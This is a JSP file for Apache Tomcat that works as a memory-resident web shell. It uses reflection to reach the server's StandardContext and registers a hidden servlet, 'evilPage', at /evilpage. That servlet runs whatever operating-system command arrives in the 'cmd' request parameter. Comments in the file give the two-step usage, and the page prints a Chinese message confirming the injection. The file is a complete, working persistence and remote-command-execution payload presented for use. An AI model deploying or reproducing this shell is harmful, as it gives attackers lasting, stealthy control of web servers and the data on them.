<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "org.apache.catalina.core.ApplicationContext"%>
<%@ page import = "org.apache.catalina.core.StandardContext"%>
<%@ page import = "javax.servlet.*"%>
<%@ page import = "javax.servlet.annotation.WebServlet"%>
<%@ page import = "javax.servlet.http.HttpServlet"%>
<%@ page import = "javax.servlet.http.HttpServletRequest"%>
<%@ page import = "javax.servlet.http.HttpServletResponse"%>
<%@ page import = "java.io.IOException"%>
<%@ page import = "java.lang.reflect.Field"%>


<!-- 1 request this file -->
<!-- 2 request thisfile/../evilpage?cmd=calc -->


<%
class EvilServlet implements Servlet{
    @Override
    public void init(ServletConfig config) throws ServletException {}
    @Override
    public String getServletInfo() {return null;}
    @Override
    public void destroy() {}    public ServletConfig getServletConfig() {return null;}

    
    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        HttpServletRequest request1 = (HttpServletRequest) req;
        HttpServletResponse response1 = (HttpServletResponse) res;
        if (request1.getParameter("cmd") != null){
            Runtime.getRuntime().exec(request1.getParameter("cmd"));
        }
        else{
            response1.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }
}

%>


<%
ServletContext servletContext =  request.getSession().getServletContext();

Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); 
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); 
EvilServlet evilServlet = new EvilServlet();


org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();
evilWrapper.setName("evilPage");
evilWrapper.setLoadOnStartup(1);
evilWrapper.setServlet(evilServlet);
evilWrapper.setServletClass(evilServlet.getClass().getName());
standardContext.addChild(evilWrapper);
standardContext.addServletMapping("/evilpage", "evilPage");

out.println("动态注入servlet成功");

%>
